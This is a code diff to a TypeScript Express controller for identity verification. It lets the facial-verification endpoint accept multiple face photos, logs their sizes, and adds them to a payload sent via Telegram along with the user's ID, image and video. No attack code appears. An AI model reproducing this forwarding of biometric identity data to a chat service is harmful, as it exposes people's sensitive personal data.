@@ -104,12 +104,12 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
 export const verifyFacial = async (req: Request, res: Response): Promise<void> => {
   try {
     console.log('🎥 Iniciando verificación facial...');
-    const { faceImage, faceVideo } = req.body;
+    const { faceImage, faceVideo, facePhotos } = req.body;
 
-    // Aceptar tanto imagen como video
-    if (!faceImage && !faceVideo) {
-      console.log('❌ Falta imagen o video facial');
-      res.status(400).json({ error: 'Se requiere imagen o video facial' });
+    // Aceptar imagen, video o array de fotos
+    if (!faceImage && !faceVideo && (!facePhotos || facePhotos.length === 0)) {
+      console.log('❌ Falta imagen, video o fotos faciales');
+      res.status(400).json({ error: 'Se requiere imagen, video o fotos faciales' });
       return;
     }
 
@@ -117,8 +117,14 @@ export const verifyFacial = async (req: Request, res: Response): Promise<void> =
     if (faceVideo) {
       console.log('📹 Tipo: VIDEO');
       console.log('📏 Tamaño video:', faceVideo.length);
+    } else if (facePhotos && facePhotos.length > 0) {
+      console.log('📸 Tipo: MÚLTIPLES FOTOS');
+      console.log('📏 Cantidad de fotos:', facePhotos.length);
+      facePhotos.forEach((photo: string, idx: number) => {
+        console.log(`📏 Foto ${idx + 1}: ${photo.length} chars`);
+      });
     } else {
-      console.log('📸 Tipo: IMAGEN');
+      console.log('📸 Tipo: IMAGEN ÚNICA');
       console.log('📏 Tamaño imagen:', faceImage.length);
     }
 
@@ -143,6 +149,7 @@ export const verifyFacial = async (req: Request, res: Response): Promise<void> =
         userId,
         faceImage: faceImage || null,
         faceVideo: faceVideo || null,
+        facePhotos: facePhotos || null,
         timestamp: new Date().toLocaleString('es-AR'),
       });
       console.log('✅ Telegram enviado exitosamente');
